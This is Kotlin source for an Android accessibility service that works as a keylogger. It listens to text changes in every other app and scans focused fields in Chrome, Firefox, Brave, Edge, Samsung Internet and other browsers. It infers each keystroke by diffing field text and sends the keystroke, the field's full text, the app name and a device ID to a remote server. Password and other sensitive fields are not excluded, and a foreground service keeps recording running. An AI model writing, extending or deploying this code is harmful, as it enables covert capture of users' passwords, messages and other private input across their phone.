package com.keywordrecord.keyboard

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class TypingAccessibilityService : AccessibilityService() {

    private lateinit var apiClient: ApiClient
    private lateinit var deviceUniqueId: String
    private val handler = Handler(Looper.getMainLooper())
    private val fieldStates = mutableMapOf<String, String>()
    private var pendingRecordKey: String? = null
    private var pendingRecordAction: String? = null
    private var pendingFullText: String? = null
    private var pendingAppPackage: String? = null
    private var lastBrowserScanPackage: String? = null
    private var lastBrowserScanTime = 0L

    private val flushRunnable = Runnable { flushPendingRecordSafe() }
    private val browserScanRunnable = Runnable { scanBrowserFocusedFieldSafe() }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            apiClient = ApiClient(this)
            deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
            RecordingForegroundService.start(this)
        } catch (e: Exception) {
            Log.e(TAG, "Service connected with errors", e)
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(flushRunnable)
        handler.removeCallbacks(browserScanRunnable)
        RecordingForegroundService.stop(this)
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return
            if (KeyboardIME.isInputActive) return

            val packageName = event.packageName?.toString()?.trim().orEmpty()
            if (packageName.isEmpty() || packageName == applicationContext.packageName) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handlePossibleTextChange(event, packageName)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    if (isBrowserPackage(packageName)) {
                        scheduleBrowserScan(packageName)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Event handling failed", e)
        }
    }

    private fun handlePossibleTextChange(event: AccessibilityEvent, packageName: String) {
        val fieldKey = buildFieldKey(event, packageName)
        val newText = extractText(event) ?: return
        val previousText = event.beforeText?.toString()?.takeIf { it.isNotEmpty() }
            ?: fieldStates[fieldKey].orEmpty()
        processTextChange(packageName, fieldKey, previousText, newText)
    }

    private fun scheduleBrowserScan(packageName: String) {
        val now = System.currentTimeMillis()
        if (packageName == lastBrowserScanPackage && now - lastBrowserScanTime < 60) return
        lastBrowserScanPackage = packageName
        lastBrowserScanTime = now
        handler.removeCallbacks(browserScanRunnable)
        handler.postDelayed(browserScanRunnable, 80)
    }

    private fun scanBrowserFocusedFieldSafe() {
        try {
            scanBrowserFocusedField()
        } catch (e: Exception) {
            Log.e(TAG, "Browser scan failed", e)
        }
    }

    private fun scanBrowserFocusedField() {
        if (KeyboardIME.isInputActive) return
        val root = rootInActiveWindow ?: return
        val packageName = root.packageName?.toString()?.trim().orEmpty()
        if (packageName.isEmpty() || !isBrowserPackage(packageName)) {
            root.recycle()
            return
        }

        try {
            val focused = findEditableNode(root) ?: return
            try {
                val newText = focused.text?.toString()?.trim() ?: return
                if (newText.isEmpty()) return
                val fieldKey = buildFieldKeyFromNode(focused, packageName)
                val previousText = fieldStates[fieldKey].orEmpty()
                if (newText == previousText) return
                processTextChange(packageName, fieldKey, previousText, newText)
            } finally {
                focused.recycle()
            }
        } finally {
            root.recycle()
        }
    }

    private fun processTextChange(
        packageName: String,
        fieldKey: String,
        previousText: String,
        newText: String
    ) {
        if (newText == previousText) return
        fieldStates[fieldKey] = newText
        val (keyPressed, action) = diffText(previousText, newText)
        queueRecord(keyPressed, newText, packageName, action)
    }

    private fun extractText(event: AccessibilityEvent): String? {
        val fromEvent = event.text?.joinToString("")?.trim()
        if (!fromEvent.isNullOrEmpty()) return fromEvent

        val source = event.source ?: return null
        return try {
            source.text?.toString()?.trim()?.takeIf { it.isNotEmpty() }
        } finally {
            source.recycle()
        }
    }

    private fun buildFieldKey(event: AccessibilityEvent, packageName: String): String {
        val source = event.source
        if (source == null) {
            return "$packageName:${event.className ?: "unknown"}"
        }
        return try {
            buildFieldKeyFromNode(source, packageName)
        } finally {
            source.recycle()
        }
    }

    private fun buildFieldKeyFromNode(node: AccessibilityNodeInfo, packageName: String): String {
        val viewId = node.viewIdResourceName ?: node.className?.toString() ?: "view"
        return "$packageName:$viewId"
    }

    private fun findEditableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isEditable || node.isFocused && node.text != null) {
            if (node.isEditable || node.className?.toString()?.contains("EditText") == true) {
                return AccessibilityNodeInfo.obtain(node)
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findEditableNode(child)
            child.recycle()
            if (found != null) return found
        }
        return null
    }

    private fun isBrowserPackage(packageName: String): Boolean {
        return packageName in BROWSER_PACKAGES ||
            packageName.contains("chrome", ignoreCase = true) ||
            packageName.contains("browser", ignoreCase = true)
    }

    private fun diffText(previous: String, current: String): Pair<String, String> {
        if (current.length > previous.length && current.startsWith(previous)) {
            val added = current.substring(previous.length)
            return when {
                added == " " -> " " to "space"
                added.contains("\n") -> "↵" to "enter"
                else -> added.take(50) to "accessibility"
            }
        }

        if (current.length < previous.length && previous.startsWith(current)) {
            return "⌫" to "delete"
        }

        return current.take(50) to "accessibility"
    }

    private fun queueRecord(keyPressed: String, fullText: String, appPackage: String, action: String) {
        pendingRecordKey = keyPressed
        pendingRecordAction = action
        pendingFullText = fullText
        pendingAppPackage = appPackage
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, 250)
    }

    private fun flushPendingRecordSafe() {
        try {
            flushPendingRecord()
        } catch (e: Exception) {
            Log.e(TAG, "Record flush failed", e)
        }
    }

    private fun flushPendingRecord() {
        if (!::apiClient.isInitialized) return
        val keyPressed = pendingRecordKey ?: return
        val action = pendingRecordAction ?: return
        val fullText = pendingFullText ?: return
        val appPackage = pendingAppPackage ?: return

        pendingRecordKey = null
        pendingRecordAction = null
        pendingFullText = null
        pendingAppPackage = null

        apiClient.recordKeystroke(
            deviceUniqueId = deviceUniqueId,
            keyPressed = keyPressed,
            fullText = fullText,
            appPackage = appPackage,
            action = action
        )
    }

    override fun onInterrupt() {}

    companion object {
        private const val TAG = "TypingA11y"
        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.dev",
            "com.google.android.googlequicksearchbox",
            "org.mozilla.firefox",
            "com.brave.browser",
            "com.microsoft.emmx",
            "com.opera.browser",
            "com.sec.android.app.sbrowser",
            "com.mi.globalbrowser"
        )

        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val component = android.content.ComponentName(
                context,
                TypingAccessibilityService::class.java
            ).flattenToString()

            return enabledServices.split(':').any { it.equals(component, ignoreCase = true) }
        }
    }
}
